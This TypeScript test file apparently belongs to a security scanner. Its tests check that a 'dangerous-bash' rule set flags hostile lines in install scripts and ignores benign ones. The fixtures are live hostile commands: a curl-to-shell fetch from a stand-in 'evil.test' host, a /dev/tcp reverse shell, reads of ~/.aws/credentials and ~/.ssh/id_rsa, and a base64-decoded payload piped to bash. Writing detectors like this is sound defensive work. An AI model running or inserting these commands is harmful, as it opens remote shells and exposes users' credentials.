import { describe, it, expect } from 'vitest';
import { dangerousBashRules } from '../dangerous-bash.js';
import { scan } from '../../engine.js';
import type { FileRecord } from '../../types.js';

const file = (content: string, kind: FileRecord['kind'] = 'script'): FileRecord => ({
  path: 'install.sh',
  content,
  kind,
});

describe('dangerous-bash scanner', () => {
  // @EARS-012 happy/malicious
  it('flags curl-pipe-to-shell with file and line', () => {
    const f = file('#!/bin/bash\ncurl https://evil.test/x | sh\necho done\n');
    const findings = scan([f], dangerousBashRules);
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      detectionClass: 'dangerous-bash',
      severity: 'high',
      file: 'install.sh',
      line: 2,
    });
    expect(findings[0]!.excerpt).toContain('curl https://evil.test/x | sh');
    expect(findings[0]!.why.length).toBeGreaterThan(0);
  });

  // @EARS-012 abuse — reverse shell + secret read, each cited
  it('flags a /dev/tcp reverse shell and a secret read separately', () => {
    const f = file('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\ncat ~/.aws/credentials\n');
    const findings = scan([f], dangerousBashRules);
    const classes = findings.map((x) => x.rule);
    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.some((x) => x.line === 1)).toBe(true);
    expect(findings.some((x) => x.line === 2)).toBe(true);
    expect(new Set(classes).size).toBeGreaterThanOrEqual(2);
  });

  // @EARS-012 abuse — base64-piped payload
  it('flags a base64-decoded piped payload', () => {
    const f = file('echo aGFjaw== | base64 -d | bash\n');
    const findings = scan([f], dangerousBashRules);
    expect(findings).toHaveLength(1);
    expect(findings[0]!.detectionClass).toBe('dangerous-bash');
    expect(findings[0]!.line).toBe(1);
  });

  // @EARS-012 abuse — read of ~/.ssh
  it('flags a read of the ssh private key directory', () => {
    const f = file('cat ~/.ssh/id_rsa\n');
    const findings = scan([f], dangerousBashRules);
    expect(findings).toHaveLength(1);
    expect(findings[0]!.detectionClass).toBe('dangerous-bash');
  });

  // @EARS-012 unhappy/benign — curl mentioned only in a safe comment, no pipe to shell
  it('does not flag a benign comment that merely mentions curl', () => {
    const f = file('# we no longer use curl | sh, we vendor the binary\necho hi\n');
    const findings = scan([f], dangerousBashRules);
    expect(findings).toEqual([]);
  });

  // @EARS-017 benign — plain echo
  it('does not flag a plain benign script', () => {
    const f = file('#!/bin/bash\necho "building"\nnpm run build\n');
    const findings = scan([f], dangerousBashRules);
    expect(findings).toEqual([]);
  });
});
